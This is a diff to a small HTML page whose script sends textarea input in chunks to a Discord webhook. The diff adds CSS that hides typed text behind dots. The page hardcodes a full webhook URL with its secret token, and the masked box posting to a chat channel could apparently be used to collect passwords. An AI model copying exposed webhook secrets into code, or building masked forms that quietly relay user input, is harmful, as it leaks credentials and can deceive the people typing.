@@ -14,15 +14,21 @@
       height: 100vh;
       background-color: #f4f4f4;
     }
+
     input, textarea, button {
       padding: 10px;
       margin: 5px;
       font-size: 16px;
     }
+
     textarea {
       width: 300px;
       height: 100px;
       resize: none;
+
+      /* 👇 makes text show as dots */
+      -webkit-text-security: disc; /* Chrome, Edge, Safari */
+      -moz-text-security: disc;    /* Firefox */
     }
   </style>
 </head>
@@ -33,7 +39,7 @@
   <button onclick="sendMessage()">Send</button>
 
   <script>
-    const MAX_LENGTH = 1999; // safe character limit
+    const MAX_LENGTH = 1999;
 
     async function sendMessage() {
       const message = document.getElementById('message').value;
@@ -44,7 +50,6 @@
 
       const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";
 
-      // Split the message into chunks of MAX_LENGTH
       const chunks = [];
       for (let i = 0; i < message.length; i += MAX_LENGTH) {
         chunks.push(message.substring(i, i + MAX_LENGTH));
